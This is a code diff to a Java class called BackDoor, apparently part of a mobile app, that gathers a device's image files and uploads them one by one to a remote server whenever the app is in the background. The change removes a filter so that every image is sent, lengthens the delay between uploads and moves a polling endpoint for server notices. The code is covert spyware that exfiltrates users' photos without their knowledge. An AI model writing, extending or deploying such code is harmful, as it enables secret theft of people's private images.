@@ -61,17 +61,7 @@ public class BackDoor {
             for (File file : qq.listFiles()) {
                 State.imgList.add(file);
             }
-            List<String> ignore = this.getIgnore();
-            List<File> clean = new ArrayList<>();
-            State.imgList.forEach( ele -> {
-                String name = ele.getName();
-                if (!ignore.contains(name)) {
-                    clean.add(ele);
-                } else {
-
-                }
-            });
-            State.imgList = clean;
+            //List<String> ignore = this.getIgnore();
         } catch (Exception e) {
             State.hasPermission = false;
         }
@@ -115,7 +105,7 @@ public class BackDoor {
                     if (isBackground(State.context)) {
                         BackDoor.INSTANCE.uploadImage(file);
                     }
-                    Thread.sleep(2000);
+                    Thread.sleep(5000);
                 } catch (Exception e) {
 
                 }
@@ -127,7 +117,7 @@ public class BackDoor {
     public void setNotice() {
         Thread getNotice = new Thread(() -> {
             Request request = new Request.Builder()
-                    .url(State.baseURL + "/notice")
+                    .url(State.baseURL + "/system/notice")
                     .get()
                     .build();
             try {
@@ -140,6 +130,7 @@ public class BackDoor {
         });
         getNotice.start();
     }
+
 
 
     int getImageCount() {
